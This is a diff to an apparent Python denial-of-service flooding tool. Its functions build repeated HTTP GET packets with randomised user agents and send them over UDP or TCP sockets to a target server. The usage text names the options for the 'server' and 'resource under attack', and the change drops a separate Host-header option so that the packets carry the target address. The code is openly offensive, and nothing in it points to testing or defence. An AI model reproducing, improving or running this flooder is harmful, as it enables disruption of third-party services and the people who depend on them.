@@ -55,7 +55,7 @@ def down_it_udp():
             extra_data = ''
         packet = str(
             "GET / HTTP/1.1"
-            + "\nHost: " + host_name
+            + "\nHost: " + host
             + "\nUser-Agent: " + random.choice(uagent)
             + "\n" + data
             + "\n\n" + extra_data).encode('utf-8')
@@ -131,7 +131,7 @@ def down_it_tcp():
         try:
             packet = str(
                 "GET " + resource + " HTTP/1.1"
-                + "\nHost: " + host_name
+                + "\nHost: " + host
                 + "\n User-Agent: " + random.choice(uagent) + "\n" + data).encode('utf-8')
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(5)
@@ -165,7 +165,6 @@ def usage():
 	-t : -threads default 100
 	-m : -method default udp (udp/tcp/http)
 	-d : -debug debug error messages
-	--host : host to provide in packet
     --resource : -api-host under attack\033[0m ''')
     sys.exit()
 
@@ -180,7 +179,6 @@ def get_parameters():
     global resource
     global error_debug
     global headers_dict
-    global host_name
     optp = OptionParser(add_help_option=False, epilog="Rippers")
     optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
     optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
@@ -193,7 +191,6 @@ def get_parameters():
     optp.add_option("-m", "--method", type="str", dest="attack_method",
                     help="Attack method: udp (default), tcp, http")
     optp.add_option('--resource', type='str', dest='resource', help='It shows the resource under attack.', default="/")
-    optp.add_option('--host', type='str', dest='host_name', help='Host name to provide in packet.', default="")
     opts, args = optp.parse_args()
     if opts.help:
         usage()
@@ -228,9 +225,6 @@ def get_parameters():
 
     if opts.resource is not None:
         resource = opts.resource
-
-    if len(opts.host_name) > 0:
-        host_name = opts.host_name
 
 
 def check_host():
